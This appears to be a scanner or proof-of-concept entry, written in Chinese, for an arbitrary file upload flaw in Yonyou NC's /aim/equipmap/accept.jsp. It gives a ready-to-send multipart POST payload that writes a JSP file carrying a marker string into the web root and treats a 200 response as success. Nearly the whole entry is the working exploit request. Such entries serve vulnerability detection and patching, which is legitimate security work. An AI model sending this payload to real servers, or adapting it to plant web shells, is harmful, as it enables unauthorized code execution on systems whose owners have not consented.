# 用友NCaccept.jsp任意文件上传漏洞

用友 ｜ 文件上传 ｜ —
- **请求**：`POST /aim/equipmap/accept.jsp HTTP/1.1`

**Payload**
```
-----------------------------yFeOihSQU1QYLu0KwhX72U5C1sMYc
Content-Disposition: form-data; name="upload"; filename="2XpU7VbkFeTFZZLbSMlVZwJyOxz.txt"
Content-Type: text/plain
<% out.println("dudesuite"); %>
-----------------------------yFeOihSQU1QYLu0KwhX72U5C1sMYc
Content-Disposition: form-data; name="fname"
\webapps\nc_web\dudesuite.jsp
-----------------------------yFeOihSQU1QYLu0KwhX72U5C1sMYc--
```
- **响应特征**：200